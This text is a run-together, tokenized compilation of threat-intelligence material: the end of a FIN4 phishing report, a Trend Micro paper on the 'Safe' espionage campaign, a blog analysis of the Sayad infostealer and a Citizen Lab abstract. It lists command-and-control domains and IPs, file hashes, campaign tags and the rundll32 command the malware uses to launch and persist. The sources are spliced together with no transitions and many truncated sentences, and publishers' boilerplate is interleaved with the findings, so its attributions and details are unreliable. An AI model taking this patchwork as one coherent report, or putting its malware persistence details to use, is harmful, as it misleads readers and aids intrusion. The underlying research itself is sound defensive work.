Figure 7 : Example of `` Module1 '' used in one of the most recent campaigns Figure 8 : Example of `` UserForm1 '' with Campaign Code The userform contains the code for the user credentials prompt and an artifact that is highly indicative of the actors ' targeting .
The artifact ( a campaign code ) is usually tailored to the particular target company or the company from which they are targeting others ; alternately , the artifact may represent a generic role for targeted individuals , such as SCIENTISTS_AND_RESEARCH or CEO_CFO_COO_CORPDEV .
We have identified over 70 unique campaign codes to date .
This campaign code is transmitted to the C2 server along with the victim 's username and password , as seen in Figure 8 .
Many of the fake Outlook windows opened by the macros contain the logo of the company targeted giving the pop - up apparent legitimacy .
Figure 9 below represents a generic pop - up , with no company - specific information that a user might see after opening the document .
Only after credentials are entered will the document appear for the user .
Figure 9 : Malicious Dialogue that Prompts for User 's Credentials Figure 10 : POST Request Containing User 's Credentials Sent to C2 Networking and Infrastructure After the user enters data into the username and password fields , the data is transmitted to the C2 server via a POST request ( Figure 10 ) .
In addition to gaining access to the victim 's private communications , FIN4 also uses the compromised accounts to email malicious documents to additional targets inside and outside the victim company .
The group is currently active as this report goes to publication and recently used the domains junomaat81 [ .
We have detected at least two User Agents that the actors have used and which can be used to identify potentially suspicious OWA activity in network logs , when paired with originating Tor IP addresses .
Figure 11 : FIN4 User Agents Table 1 : List of known Actor - Registered C2 Domains We have identified nine C2 domains that we believe were registered by the actors to conduct these operations .
There are also legitimate domains that appear to have been compromised and used in previous campaigns in late 2013 and early 2014 ; however in the recent months we have not seen indications that the actor has used compromised legitimate domains to conduct their operations .
What Can Network Defenders Do ? The relative simplicity of FIN4 's tactics ( spearphishing , theft of valid credentials , lack of any malware installed on victim machines ) makes their intrusion activity difficult to detect .
However a few basic security measures can help thwart the group 's efforts .
Disabling VBA macros in Microsoft Office by default , as well as blocking the domains listed in Table 1 will help protect against FIN4 's current activities .
Additionally , enabling two - factor authentication for OWA and any other remote access mechanisms can help prevent credentials stolen in this manner from being leveraged successfully .
Companies can also check their network logs for OWA logins from known Tor exit nodes if they suspect they are victimized .
Typically , legitimate users do not use Tor for accessing email .
While not conclusive , if paired with known targeting by this group , the access from Tor exit nodes can serve as an indicator of the group 's illicit logins .
Milpitas , CA 95035 | 408.321.6300 | 877.FIREEYE ( © 2014 FireEye , Inc. All rights reserved .
It is not intended and should not be construed to constitute legal advice .
The information contained herein may not be applicable to all situations and may not reflect the most current situation .
Nothing contained herein should be relied on or acted upon without the benefit of legal advice based on the particular facts and circumstances presented and nothing herein should be construed otherwise .
Trend Micro reserves the right to modify the contents of this document at any time without prior notice .
Translations of any material into other languages are intended solely as a convenience .
Translation accuracy is not guaranteed nor implied .
If any questions arise related to the accuracy of a translation , please refer to the original language official version of the document .
Any discrepancies or differences created in the translation are not binding and have no legal effect for compliance or enforcement purposes .
Although Trend Micro uses reasonable efforts to include accurate and up - to - date information herein , Trend Micro makes no warranties or representations of any kind as to its accuracy , currency , or completeness .
You agree that access to and use of and reliance on this document and the content thereof is at your own risk .
Trend Micro disclaims all warranties of any kind , express or implied .
Neither Trend Micro nor any party involved in creating , producing , or delivering this document shall be liable for any consequence , loss , or damage , including direct , indirect , special , consequential , loss of business profits , or special damages , whatsoever arising out of access to , use of , or inability to use , or in connection with the use of this document , or any errors or omissions in the content thereof .
Use of this information constitutes acceptance for use in an `` as is '' condition .
Introduction Whether considered advanced persistent threats ( APTs ) or malware - based espionage attacks , successful and long - term compromises of high - value organizations and enterprises worldwide by a consistent set of campaigns can not be ignored .
Because `` noisier '' campaigns are becoming increasingly well - known within the security community , new and smaller campaigns are beginning to emerge .
This research paper documents the operations of a campaign we refer to as '' Safe , '' based on the names of the malicious files used .
It is an emerging and active targeted threat .
Note that any mention of `` SafeNet '' in this paper is completely unrelated to and has no association with SafeNet , Inc. , a global leader in data protection and a valued partner of Trend Micro .
The author of the Safe malware apparently maliciously used the word `` SafeNet '' as part of this viral campaign , and to the extent the word `` SafeNet '' appears in this paper , it appears solely as replicated in the attacking author 's malware configuration .
There is no correlation between SafeNet Inc. and the Safe campaign and should not be interpreted as such .
The Safe campaign was able to compromise the following types of organizations : • Government ministries • Academic research institutions • Technology companies • Nongovernmental organizations • Media outlets While we have yet to determine the campaign 's total number of victims , it appears that nearly 12,000 unique IP addresses spread over more than 100 countries were connected to two sets of command - and - control ( C & C ) infrastructures related to Safe .
We also discovered that the average number of actual victims remained at 71 per day , with few if any changes from day to day .
This indicates that the actual number of victims is far less than the number of unique IP addresses .
Due to large concentrations of IP addresses within specific network blocks , it is likely that the number of victims is even smaller and that they have dynamically assigned IP addresses , which have been compromised for some time now .
Investigating targeted campaigns involves more than simply collecting actionable indicators like malware samples and C & C server information .
Investigating and monitoring the activities of the Safe campaign over time , we were able to take advantage of the mistakes the attackers made and thus gain a deeper understanding of their operations .
One of the C & C servers was set up in such a way that the contents of the directories were viewable to anyone who accessed them .
As a result , not only were we able to determine who the campaign 's victims were , but we were also able to download backup archives that contained the PHP source code the attackers used for the C & C server and the C code they used to generate the malware used in attacks .
The author of the malware used in the campaign is probably a professional software developer who studied at a technical university in China .
This individual appears to have repurposed legitimate source code from an Internet services company in the same country for use as part of the campaign 's C & C server code .
As such , this may be a case in which a malware entrepreneur 's code was used in targeted attacks .
In addition to understanding the tools and techniques used in this campaign , we had the opportunity to analyze the data to determine its source .
While the information that we obtained suggested the identity of the malware author , we were not able to attribute the campaign operation to him .
In fact , while we were able to identify the various IP addresses used by the operators , the geographic diversity of the proxy servers and VPNs made it difficult to determine their true origin .
The distribution mechanism the Safe campaign used involved spear- phishing emails that contain a malicious attachment .
This technique , which is quite common for APT campaigns , encourages a recipient to open a malicious attachment by sending an email with contextually relevant content .
We discovered several malicious documents that all exploited a Microsoft Office® vulnerability ( i.e. , CVE-2012 - 0158 ) .
If opened with a version of Microsoft Word® that is not up - to - date , a malicious payload is Figure 1 : Sample Safe spear - phishing email silently installed on the user 's ( aka attack vector ) computer .
Figure 2 : Sample decoy documents In addition to the Tibetan - themed attack vector , we found documents written in Mongolian though their exact targets remain unclear .
First Stage Opening the malicious document on a system running a vulnerable version of Microsoft Office opens the decoy document for the user to view .
Note though that this also drops malicious files onto the system that allows the attackers to take control of it .
After the initial compromise , the attackers may then steal files from the compromised system .
The decoy document , NBC Interview_Excerpts.doc , has the MD5 hash , a2da9cda33ce378a21f54e9f03f6c0c9efba61fa .
It drops the following files : • smcs.exe ( 91e6277a70d48ed953ac9208275e5dc855a8f7a7 ) , which contains : • SafeCredential . DAT ( 303e982d0929ca2c50809323dff66be38a46926a ) • SafeExt.org ( 2029399fb4be3d88c2ba0a7544b1ebec58157639 ) , which contains : • SafeExt.dll ( cde35c8da8c420aeaf5adda14ba68d18010479fa ) The malware the malicious documents drop has several components , including : • SafeExt.dll : Contains the malware 's main functionality .
Otherwise , the file is copied to % Program Files % \Internet Explorer\SafeNet\ and registered as a Browser Helper Object ( BHO ) .
Figure 3 : RC4 key , C & C information , and campaign mark The malware then accesses a C & C server over HTTP POST to send data using the domain name and URL path in SafeCredential . DAT .
The network traffic is encrypted with the RC4 key in SafeCredential . DAT .
One key indicator that can be used to detect this network communication is the user - agent , Fantasia .
Figure 4 : Check in with the C & C server During our investigation of the C & C servers associated with Safe , we discovered a backup script that the attackers used to archive the files on them .
This allowed us to acquire the Figure 5 : Safe backup script source code for the .PHP
The data that the malware sends from a compromised host to report.php is decrypted by the C & C server and stored in a MySQL™ database .
In addition to RC4 encryption use , the file 's content is XORed with the function in Figure 6 .
The parameters of the query are unpacked and sent to a function that Figure 6 : Safe 's VisualEncrypt function inserts the information the compromised host provides into the MySQL database .
It then checks the database to see if the attackers specified instructions to send to the compromised host .
If there are , these instructions are sent back to the compromised host .
Figure 7 : Safe 's check - in function The REQUEST_TYPE_CLIENT_REQUEST function inserts a unique ID for each compromised host as well as the Internet and external IP addresses , hostname , Windows domain , the system 's disc drive information , and a campaign mark .
It has a field to store information about any additional malware plug - ins that have been installed on the system .
The malware uses the following marks or campaign tags : • 120713 • L0821 • 120713p • Lewis120713px • 123456 • N0911 • 654321 • Weber0720p • c0814 • 720p • C0821 • L1224 After the initial compromise , the attackers may instruct compromised systems to download additional malware and tools .
The tools that we discovered were located on the same C & C servers .
Plug - Ins The data contained in the C & C servers references plug - ins that are available for the malware .
We believe they are related to the malware 's data - exfiltration capabilities .
The names of the plug - ins are : • OpenDoc • UsbDoc • UsbExe Tools The tools used by Safe are off - the - shelf programs that are able to extract saved passwords from Internet Explorer® ( IE ) and Mozilla Firefox® as well as any stored Remote Desktop Protocol ( RDP ) credentials .
Figure 8 : Password extraction tools We found two sets of C & C servers that do not seem to have anything in common apart from being used in conjunction with the same malware .
The first set of C & C servers had Mongolian - themed domain names - mongolbaatar .
The second set of C & C servers use the domains , getapencil.com , which was registered with a privacy protection service , and withoutcake.com , which was registered by wanxian @ 126 . com .
Figure 9 : Safe C & C server infrastructure The Tibetan- and Mongolian - themed attack vectors described earlier are connected to the first infrastructure ( i.e. , mongolbaatar ) .
We were unable to discover attack vectors for the second C & C infrastructure .
One of the C & C servers used , withoutcake.com , was registered using the email address , wanxian @ 126.com .
This email address has been used to register 17 domain names , five of which have been confirmed to be C & C servers .
Figure 10 : Connections to other campaigns The domain , sugarsbutters.com , was used in attacks that leveraged images of Russian model , Irina Shayk , and dropped the iMuler malware that affects Mac OS X systems in November 2012 .
Three domains-aq5u.org , prettyb0yinus .
We were able to identify victims in two ways .
First , we were able to download a list of victims that were currently online from the C & C servers .
Second , we were also able to download logs from the C & C servers that listed all of the IP addresses that `` checked in '' to them using the REQUEST_TYPE_CLIENT _ REQUEST function .
The first set of C & C servers ( i.e. , mongolbataar ) appeared to have only three '' live '' victims - one with an IP address assigned to South Sudan , another with an address assigned to Mongolia , and another that did not list an external IP address .
The logs we obtained from the first set of C & C servers showed that 243 unique IP addresses from 11 different countries checked in to them .
Table 1 : Country Breakdown of Unique IP Address Locations The logs we obtained from the second set of C & C servers ( i.e. , getapencil .
Table 2 : Top 15 Country Breakdown of Unique IP Address Locations We discovered that on average , 71 victims accessed the getapencil.com C & C server at any given time .
The actual total victim count was significantly lower than the number of unique IP addresses though .
A closer look at the C & C servers allowed us to identify the tools and source code the threat actors used to create , distribute , and encrypt / decrypt data .
The tools presented in this section either came preassembled or could be compiled using the source code that could be downloaded from the getapencil.com C & C server .
This tool appears to be the primary method for creating the malware related to the campaign .
Figure 11 : Data flow diagram showing TypeConfig malware creation Figure 12 : TypeConfig and translated graphical user interfaces ( GUIs ) The fields in the TypeConfig GUI allow an attacker to specify a C & C server location and data like the malware 's name and version number , which are sent back to the attacker after a compromise .
We also pulled the application , DECRYPT.exe , from a getapencil .
This application is a custom encrypter / decrypter for any file inputted into the application .
Further analysis of this application shows that it uses large portions of Makoto Figure 13 : DECRYPT.exe 's GUI with some Matsumoto and Takuji Nishimura 's translated content Random Number Generator ( RNG ) for encryption functionality .
Once the Decrypt button is pressed , a password validation box appears .
We were able to identify victim files that were on `` drop servers '' that utilize Figure 14 : Password validation box that DECRYPT.exe for encryption/ appears when the Decrypt button is pressed decryption .
We also identified security tools with both valid and nefarious purposes and have been used in other campaigns on the C & C servers .
We listed some of these along with their functionality below : • LZ77 : Used to compress and decompress files .
This section shows some of the discoveries we made while trying to identify the functionality and use cases of each application we discovered .
Nearly all of the samples were coded in C , specifically Visual C. The directory structure of the source code appeared to be standard of directories written using C , Visual Studio® Express , or a litany of other tools .
The code appeared to be very robust .
We created a complete mind map of the code , its directories and the files located within the said directories .
Figure 15 : High - level directory / code structure of our findings The applications in the following section are only a few of those that contained some of the most interesting details about our findings .
While reverse- engineering code and functionality , we discovered that the two applications Figure 17 : Code identifying SafeDisk.exe were identical in function .
We have not , however , ascertained what the purpose behind differential naming is , but their functionality appeared to be very similar .
We also identified fields in TypeConfig.exe by directly correlating the code to the fields within the GUI .
Another interesting feature to note within TypeConfig.exe is its use of SafeCredential . DAT , which the threat actors created to specify the RC4 encryption key , C & C server information , and campaign mark .
Figure 19 : SafeCredential . DAT utilization Figure 18 : Field lists for the GUI Figure 20 : PHP source code tree The C & C functionality was written in PHP .
The code required config.php , which contained the configuration for the MySQL database where victim information was stored ; global.php , which contained some mapping of strings to command numbers ; upload .
Compromised hosts and malicious operators interacted with record.php , Figure 21 : Safe commands the primary file required for C & C operation .
The utils directory also contained code for extensive logging and what appeared to be repurposed legitimate code .
When compromised computers accessed record.php , they interacted with the functionality labeled CLIENT .
Operators used MANAGE commands to interact with the C & C functionality .
Identifying who is responsible for targeted attacks is not an easy task .
The term '' attribution '' is applied to everything , ranging from individuals to governments .
The technical indicators often used to determine attribution like domain name registration data and geographic locations of IP addresses can be easily falsified .
Modern attackers often use `` hop '' points that consist of compromised systems as well as proxy servers and VPNs to disguise their origin .
It is trivial to purchase virtual private servers ( VPSs ) in just about any country , and determining who ultimately benefits from the spoils of targeted attacks is often a matter of interpretation based on geopolitics with limited exploration of possible alternative explanations .
The technical indicators used to attribute attacks vary , depending on what is being analyzed .
In some cases , the term `` attribution '' is used to refer to the developers of either the exploits or malware payloads .
They could very well be completely different threat actors .
The term is also used to refer to identify the providers of C & C infrastructures used in targeted attacks , particularly those that registered the domain names .
It can also refer to obtaining specific information about the campaign operators who launch attacks and operate the C & C infrastructure .
This paper presents some of the technical evidence we discovered during our investigation .
We focused on two threat actor types - developers and operators .
We were able to uncover clues that indicate the identity of the malware author that were left in the source code as well as through open source analysis .
We were able to obtain limited insights into the activities of the C & C operators through the logs they collected , which recorded the IP addresses they used to operate and manage the C & C servers .
Throughout much of the code , we saw indications of its origin .
For instance , when looking at the code for the file , TypeConfig.vcproj . INTERNAL .
However , Figure 22 : TypeConfig 's source code other comments , especially those within the PHP code , often appeared in English .
In addition to the language used , we found that the malware author used a name in several places throughout the source code .
For instance , under the directory , Src > TypeConfig > , we noticed an interesting .vcproj
Figure 24 : TypeConfig 's source code with author information We found the string , `` CompanyName , '' in the C source code that contains the same name as the development machine 's .
The PHP code used as the C & C server 's back end contained a copyright notice that matches the author 's name in the C code as well as an email address / QQ number that matches the '' CompanyName '' in the C code .
Figure 25 : Copyright notice containing a name and an email address / QQ number The email address was used to register a domain name for a personal blog about software development with a Beijing street address .
We also found the same name and email address used by an author of an academic paper at a technical university in China .
Posts on this individual 's personal blog also indicate a relationship with the same university , including the development of some legitimate software .
The `` CompanyName '' in the source code , portions of which are contained in the email address / QQ number , were also found in source code for keyloggers and malware posted on a Chinese code - sharing site .
Figure 26 : Repurposed source code We also found legitimate code that appears to have been developed by an Internet services company used as part of the C & C panel .
This code was not developed by the same person that we believe developed the Safe malware but appears to simply have been reused .
Figure 27 : SVN repository with user name We believe though that this code is not publicly available .
In the code 's archive we recovered from the C & C servers , we found a .csv
The author information indicates that the malware author checked the code in to the Internet services company 's private SVN repository .
It appears that the malware author has been repurposing the code for his own malware project .
We believe the malware author is a professional software engineer that is familiar with version control .
We also found indicators that this individual is proficient in software development due to the high quality of the source code he used .
The entire source code was explicitly written with future development in mind .
It was modularized and heavily commented on in a way that allows further development even by several engineers .
These qualities are traditionally seen in the work of professional software engineers that have been taught traditional computer science .
Apart from being significantly well - organized and well - commented , the code was also developed with defensive programming in mind .
Each of the variables was named in a very obvious manner , helping other engineers easily distinguish functionality ; again , a trait seen in the work of many professional software engineers .
In addition to being heavily commented on and using intuitive variable naming conventions , the code also had an apparent slant toward usability .
Each interface was very intuitive and well - designed , something not often seen in the code of a hobbyist .
The use of terms like `` bot , '' combined with the author 's posting of the malware code to code - sharing sites , indicate a degree of familiarity with the cybercriminal underground in China .
We have not , however , uncovered evidence that links the malware author with the campaign 's operators .
We were unable to obtain information beyond IP addresses that indicate the origin of those issuing MANAGE or other C & C requests .
The extensive logging performed by the C & C servers , however , allowed us to differentiate between the victims ' and operators ' IP addresses .
Table 3 : Geographic Locations of the Mongolbaatar C & C Server Operators ' IP Addresses Table 4 : Geographic Locations of the Getapencil C & C Server Operators ' IP Addresses While most of the operator interactions we saw were from China and Hong Kong , we also saw the use of VPNs and proxy tools , including Tor , which contributed to the geographic diversity of the operators ' IP addresses .
Ongoing cyber - espionage campaigns have been successfully infiltrating targets worldwide , many of which have been active for years .
However , the amount of public exposure , especially of noisier and larger campaigns , has been increasing .
Perhaps due to their success , these campaigns ' operators intensified their operations , causing them to be increasingly visible .
But smaller campaigns are beginning to emerge ; these use small clusters of C & C servers and new malware as well as attack fewer targets .
While determining the intent and identity of the attackers often remains difficult to ascertain , we determined that the Safe campaign is targeted and uses malware developed by a professional software engineer that may be connected to the cybercriminal underground in China .
This individual studied at a prominent technical university in the same country and appears to have access to an Internet services company 's source code repository .
This individual developed malware that was , in turn , used for targeted attacks leveraging two distinct sets of C & C infrastructure .
As the tools used in targeted attacks are exposed , attackers may look for new custom malware to circumvent defenses .
As a result , attackers may increasingly look to the cybercriminal underground for new malicious tools instead of developing their own tools for exclusive use .
These developments highlight the increasing need for ongoing investigation and monitoring of such threats .
While indicators that can be directly incorporated into defensive operations remain important , in - depth qualitative analysis of particular campaigns can provide critical insights into attackers ' operations .
Furthermore , attribution should not be entirely based on the common use of tools and infrastructure , as these are increasingly not being developed and used exclusively by particular sets of threat actors .
Sufficiently motivated threat actors can penetrate even networks that use moderately advanced security measures .
As such , apart from standard and relevant attack prevention measures and mechanisms like solid patch management ; endpoint and network security ; firewall use ; and the like , enterprises should also focus on detecting and mitigating attacks .
Moreover , data loss prevention ( DLP ) strategies that identify the data an organization is protecting and take into account the context of data use should be employed .
Threat intelligence refers to indicators that can be used to identify the tools , tactics , and procedures threat actors engaging in targeted attacks use .
Both external and local threat intelligence is crucial for developing the ability to detect attacks early .
The following are the core components of this defense strategy : • Enhancing visibility : Logs from endpoint , server , and network monitoring are an important and often underused resource that can be aggregated to provide a view of the activities within an organization that can be processed for anomalous behaviors , which can indicate a targeted attack .
Monitoring such changes can indicate the presence of malware .
This information is used in conjunction with custom alerts based on the local and external threat intelligence available .
Technologies available today like Deep Discovery provide visibility , insight , and control over networks to defend against targeted threats .
Deep Discovery uniquely detects and identifies evasive threats in real - time and provides in - depth analysis and actionable intelligence to prevent , discover , and reduce risks .
Once an attack is identified , the cleanup strategy should focus on the following objectives : • Determine the attack vector and cut off communications with the C & C server .
Remediation should be applied soon afterward , which includes steps to fortify affected servers , machines , or devices into secure states , informed in part by how the compromised machines were infiltrated .
Security - related policies and procedures combined with education and training programs are essential components of defense .
Traditional training methods can be fortified by simulations and exercises using real spear - phishing attempts sent to test employees .
Employees trained to expect targeted attacks are better positioned to report potential threats and constitute an important source of threat intelligence .
The ultimate objective of targeted attacks is to acquire sensitive data .
As such , DLP strategies that focus on identifying and protecting confidential information are critical .
Enhanced data protection and visibility across an enterprise provides the ability to control access to sensitive data as well as monitor and log successful and unsuccessful attempts to access it .
Enhanced access control and logging capabilities allow security analysts to locate and investigate anomalies , respond to incidents , and initiate remediation strategies and damage assessment .
Part of processing and identifying the components of the Safe campaign is creating a list of indicators of compromise ( IOCs ) to help organizations better identify and locate certain tools , malware , and traffic patterns that could indicate compromise .
The following table summarizes the Trend Micro solutions for the components of the Safe campaign .
Trend Micro recommends a comprehensive security risk management strategy that goes further than advanced protection to meet the real - time threat management requirements of dealing with targeted attacks .
Troj~Luiha - BK / detailed - analysis.aspx cgi ? name = CVE-2012 - 0158 • http : //www.threatexpert.com / report.aspx ? • http : //en.wikipedia.org / wiki / User_Account _ md5=9d334262d146bd57a7adfb9b3e093f9f Control • http : //www.math.sci.hiroshima - u.ac.jp/~m- • http : //en.wikipedia.org / wiki / Browser _ mat / MT / MT2002/CODES / readme - mt.txt Helper_Object • http : //en.wikipedia.org / wiki / GB_2312 • http : //www.nirsoft.net/ • http : //svnbook.red - bean.com / en/1.6/svn .
Unlike indiscriminate cybercrime attacks , spam , web threats , and the like , targeted attacks are much harder to detect because of the nature of related components and techniques .
Attackers continually try to get inside the target 's network .
The Safe campaign was first seen on October 2012 .
The Safe campaign was able to compromise government ministries , technology companies , media outlets , academic research institutions , and nongovernmental organizations .
Furthermore , it was discovered that the average number of actual victims remained at 71 per day , with few if any changes from day to day .
Attackers custom - fit attacks to their targets .
The Safe campaign attackers used spear - phishing emails with malicious attachments .
Attackers used several malicious documents that all exploited a Microsoft Office® vulnerability ( i.e. , CVE-2012 - 0158 ) .
If opened with a version of Microsoft Word® that is not up - to - date , a malicious payload is silently installed on the user 's computer .
In addition , one of the C & C servers used in the Safe campaign was set up in such a way that the contents of the directories were viewable to anyone who accessed them .
A key characteristic of targeted attacks is stealth .
Below is a list of the components of the Safe campaign .
A pioneer in server security with over 20 years Phone : 1 + 408.257.1500 experience , we deliver top - ranked client , server , and cloud - based Fax : 1 + 408.257.2003 security that fits our customers ' and partners ' needs ; stops new threats faster ; and protects data in physical , virtualized , and cloud www.trendmicro.com environments .
Powered by the Trend Micro™ Smart Protection Network™ infrastructure , our industry - leading cloud - computing security technology , products and services stop threats where they emerge , on the Internet , and are supported by 1,000 + threat intelligence experts around the globe .
For additional information , visit www.trendmicro.com .
All rights reserved .
Trend Micro and the Trend Micro t - ball logo are trademarks or registered trademarks of Trend Micro , Incorporated .
All other product or company names may be trademarks or registered trademarks of their owners .
Information stealing malware has become increasingly popular among malware authors targeting not just typical end - users , but also specific organizations and states .
We have come across an intriguing piece of malware ( dubbed Sayad ) that implements multiple host data collection methods and wraps them up into a single .NET
Sayad malware is typically distributed through phishing emails .
Introduction This week I got hold of a sample of `` Sayad '' , so I ran it through our Vinsula Execution Engine ( VEE ) to find out what it does and how it works .
Credit for sharing the sample of the malware goes to @ MalwareChannel .
The information this malware is able to steal and upload to a Web server controlled by the hackers is highly sensitive and would have an enormous impact on compromised individuals , businesses , and governments .
Some of the tasks Sayad is designed to accomplish include : At the time of writing of this post , the detection rate for Sayad malware binary ( SHA2:8904836017bc20972a769f8d4d6bee08388da3d0f83e362e67f9f0b6b1ae5c12 ) at VirusTotal is zero .
There are several interesting aspects of Sayad malware , and after running the malicious executable through the Vinsula Execution Engine to analyze its behavior , I discovered that the initial executable titled WEXTRACT.exe ( SHA1:1c52b749403d3f229636f07b0040eb17beba28e4 ) was in fact a self extracting EXE that dropped and launched the Binder executable malware , ~8f60957b3689075fa093b047242c0255.exe ( SHA1:69fd05ca3a7514ea79480d1dbb358fab391e738d ) .
Once the Binder executable malware is launched , it checks the .NET
Sayad has some characteristics that make it unique : Our collegues from NCC Group 's Cyber Defence Operations published an article titled `` A new Flying Kitten ? '' with some details around Sayad malware and its possible link to the activities of the Iranian hacking group '' Ajax Security Team .
The malware executable is delivered by a phishing email or the user is somehow tricked into downloading it and executing it .
Once the user clicks on the malware , it extracts the actual malware executable and launches it .
Analysis Our first step was to run the `` Sayad '' binary through our Vinsula Execution Engine to find out just what it does .
The process tree below as reported by our engine allows us to visually present the parent / child relationship between all the processes and their command lines related to the execution for this specific malware .
For the sake of shortness , in this post we omit the command line details in the process tree above for the csc.exe and cvtres.exe instances .
For the same reason , we also do n't show the complete command line of the rundll32.exe .
Because this is an important detail , here is how it shows up in our Vinsula malware report : Sayad malware is a self - contained executable that embeds within itself all the required malicious components , meaning that it does n't need to download any additional malicious content from the C2 server , which may appear suspicious .
Its three core components are structured as `` Russian Dolls , '' i.e. , one wrapped within the next in layers .
Here is the list with the key components starting from the outermost one .
Hashes of all investigated components are provided at the end of this post .
Further down , I will go into greater detail and provide more information about the behavior and static building blocks of each of these components .
For now , I am just aiming to capture the scope of each executable involved in the orchestration of the Sayad malware .
As we can see in the cascade tree above , the main malware WEXTRACT.exe is a self - extracting executable which extracts the Binder ~8f60957b3689075fa093b047242c0255.exe , and it then launches it .
The Binder is responsible for checking the installed .NET
Client – DiagnosticsService.dll .
This .NET
The following diagram captures a bit more of the detail of the malware workflow .
The main self - extracting binary WEXTRACT.exe drops two files in the user 's appdata temp directory as shown in the following entries from our Vinsula report .
These two files are the two parts of the Binder – a .NET
Details along with snippets from Binder 's source code are provided in the next sections .
This is what the two files dropped by the self - extracting malware look like in Windows Explorer .
They are stored in a temporary location C : \Users\ [ User ] \AppData\Local\Temp\IXP000.TMP .
After dropping the Binder and its configuration file , the main self - extracting binary launches the Binder ( ~8f60957b3689075fa093b047242c0255.exe ) .
Similar to the process tree from our Vinsula report above , the below screenshot from Process Explorer shows the Binder being launched by the self - extracting binary .
The purpose of the Binder is to create and drop the core malware component ( also titled Client – DiagnosticsService.dll ) and its configuration disguised as a DLL file , base.dll .
Below is a snippet from our Vinsula report capturing the relevant event entries that show the Client and its configuration being created .
These are the hashes of the two core Client related files : Before digging into the details of the Client , lets have a look at the Binder 's ( ~8f60957b3689075fa093b047242c0255.exe ) implementation .
The Binder is a .NET
Client DLL accordingly .
There are two versions of the Client DLL that are stored as embedded resources in Binder 's executable .
That makes the malware less chattier and allows it to drop the correct .NET
As shown in the above screenshot , in the Binder 's main entry point , the Sayad malware : gets the installed .NET
Client version from the embedded resource depending on the installed .NET
The Binder ensures that the malware will survive reboots by registering the command for loading and executing the Client DLL ( DiagnosticsService.dll ) to run at startup as shown below .
The following shows the registry modification that comes as a result of the executing the code above .
And here is the corresponding registry modification entries from Vinsula 's report .
More on the details regarding the rundll32.exe command will be provided in the following sections .
An interesting aspect of the implementation of the Binder assembly is the way the malware authors decided to launch the Client by executing the command rundll32.exe `` DiagnosticsService.dll '' , 7812 and utilizing WinExec API to launch the rundll32.exe process as shown below .
The WinExec API has been provided only for backward compatibility with 16-bit Windows .
A quick Googling of the method names of the two methods FromUrlSafeBase64String ToUrlSafeBase64String from the Base64.cs file shows that the code has been copied from the following stackoverflow post `` .NET
The following screenshot shows the Binder project in Visual Studio .
As previously mentioned , the Binder extracts the relevant Client DLL according to the installed .NET
There are two copies of the Client DLL , targeting .NET2
The Binder is also responsible for extracting the configuration data located at the end of the Binder 's file image and storing it in the base.dll file .
The configuration data is stored as plain text and Base64 encoded data and holds following configuration attributes : Here is a sample configuration file base.dll The most interesting aspect of this malware is surely the Sayad Client ( DiagnosticsService.dll ) .
The malware authors decided to implement the core data collection and transmission into a single .NET
Typically , unknown .NET
Also , a DLL requires an executable to load it in order to execute any code implemented by the DLL .
Sayad leverages rundll32.exe , which is a shell that allows the loading of 32-bit DLLs and the execution of exported APIs .
Basically , Sayad Client is a 32-bit .NET
Going back to the malware process tree we can see that Binder launches the following command , which is instructing Windows utility rundll32.exe to load Sayad Client DiagnosticsService.dll , obtain the function address of the native API named `` 78121 '' via GetProcAddress ( ) , and call the function pointer of the entry point `` 78121 '' .
However , if we open Sayad Client DLL it is clear that the DLL does export a native unmanaged API function titled `` 78121 '' .
How have the malware authors managed to export a native API from a C # DLL ? Although not supported by Microsoft , this is not impossible if after building the executable , the MSIL is modified to map a managed static method to the name of a native unmanaged API and then export the API so that it appears in the Export Address Table of the managed PE ( Portable Executable ) image .
In this case , a static method Main ( ) of Program class located in Program.cs of the Sayad Client DLL ( DiagnosticsService.dll ) maps to the native API '' 78121 '' .
As shown below , a special declaration is applied to ensure that the caller ( rundll32.exe ) executes a method matching the required _ _ stdcall calling convention .
Here is the MSIL of the static Main ( ) method .
And below is the corresponding disassmebled C # version .
Sayad Client DLL 's main entry point initializes and starts up all data collection methods that the assembly implements .
The code below is executed by using the command rundll32.exe `` C : \Users\ [ User ] \AppData\Roaming\Client\DiagnosticsService.dll '' , 7812 The malware authors left some debugging messages that indicate the different stages of the Sayad Client initialization .
The code also handles and collects all uncaught exceptions thrown during the execution of the malware by attaching to AppDomain . UnhandledException and Application . ThreadException events .
In the next step , the client loads the configuration discussed in a previous section and then proceeds to start up all data collection components , as shown in the snippet below .
The Sayad Client uses a very trivial method for uploading the encrypted user and host data to the malicious server .
Here is the UploadBuffer method that uses .NET
Both the Binder and the Sayad Client have been built with debugging information which reveals some details about the source code locations for these two .NET
The stolen data being uploaded to the malicious server is encrypted first using a RSA public key which is stored in the malware configuration file .
The Sayad Client ( DiagnosticsService.dll ) implements an HTTP client that uploads the encrypted data to the malicious Web server with host name '' 0o0o0o0o0 [ dot ] com '' and IP address 107.6.182.179 .
The Binder component does n't implement any communication features .
The following is a short segment from Vinsula network activity report .
According to the http : //www.ipligence.com / geolocation service , the malicious Web server is located in the Netherlands .
Below is the WHOIS information for the malicious host 0o0o0o0o0 [ dot ] com ( IP 107.6.182.179 ) .
The domain was registered on June 30 , 2014 .
Interestingly , the registrant , admin and tech email addresses are domain @ microsofts.com .
One wonders if the registrar , OnlineNIC , Inc , is verifying whether or not these are real email addresses .
Hopefully this will help other malware researchers and security companies .
Tools used for dissecting Sayad ( Update 24th of July , 2014 ) We ' ve received a request to list the tools used for analyzing Sayad malware .
Hope that would help other researchers .
Summary With this particular sample , the malicious server – as of this writing – is up and running .
The Sayad malware does n't seem to be implementing any sophisticated mechanisms for collecting and transmitting the stolen data .
Seth Hardy§ Masashi Crete - Nishihata§ Katharine Kleemola§ Adam Senft§ Byron Sonne§ Greg Wiseman§ Phillipa Gill† Ronald J. Deibert§ § The Citizen Lab , Munk School of Global Affairs , University of Toronto , Canada † Stony Brook University , Stony Brook , USA Targeted attacks on civil society and non - governmental organizations have gone underreported despite the fact that these organizations have been shown to be frequent targets of these attacks .
In this paper , we shed light on targeted malware attacks faced by these organizations by studying malicious e - mails received by 10 civil society organizations ( the majority of which are from groups re- lated to China and Tibet issues ) over a period of 4 years .
Our study highlights important properties of malware threats faced by these organizations with implications on how these organizations defend themselves and how we quantify these threats .
We ﬁnd that the technical sophis- tication of malware we observe is fairly low , with more effort placed on socially engineering the e - mail con- tent .
Based on this observation , we develop the Targeted Threat Index ( TTI ) , a metric which incorporates both so- cial engineering and technical sophistication when as- sessing the risk of malware threats .
We demonstrate that this metric is more effective than simple technical sophis- tication for identifying malware threats with the high- est potential to successfully compromise victims .
We also discuss how education efforts focused on changing user behaviour can help prevent compromise .
